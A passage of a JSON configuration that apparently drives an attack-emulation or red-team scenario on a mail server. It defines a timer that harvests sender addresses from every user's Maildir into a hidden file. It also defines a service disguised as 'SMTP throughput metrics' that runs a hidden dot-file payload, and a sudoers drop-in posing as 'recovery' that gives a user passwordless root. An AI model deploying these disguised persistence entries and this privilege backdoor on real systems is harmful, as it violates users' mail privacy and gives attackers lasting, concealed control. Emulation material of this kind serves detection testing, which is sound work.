            "EXEC_START": "/opt/redtag/harvest",
            "PAYLOAD_PATH": "/opt/redtag/harvest",
            "PAYLOAD_BODY": "grep -h '^From: ' /home/*/Maildir/new/* /home/*/Maildir/cur/* 2>/dev/null | sort -u > /var/tmp/.senders 2>/dev/null || true",
            "ON_BOOT_SEC": "5min",
            "ON_UNIT_ACTIVE_SEC": "20min"
          }
        },
        {
          "name": "systemd-service",
          "vars": {
            "SERVICE_NAME": "smtpd-metrics",
            "DESCRIPTION": "SMTP throughput metrics",
            "EXEC_START": "/opt/redtag/.metrics-snap",
            "PAYLOAD_PATH": "/opt/redtag/.metrics-snap",
            "PAYLOAD_BODY": "while :; do ss -tin 2>/dev/null | grep -c segs_out > /var/tmp/.msnap 2>/dev/null || true; sleep 30; done",
            "SERVICE_TYPE": "simple"
          }
        },
        {
          "name": "sudoers-rule",
          "vars": {
            "DROPIN_NAME": "routeaudit-recovery",
            "RULE": "routeaudit ALL=(ALL) NOPASSWD:ALL"
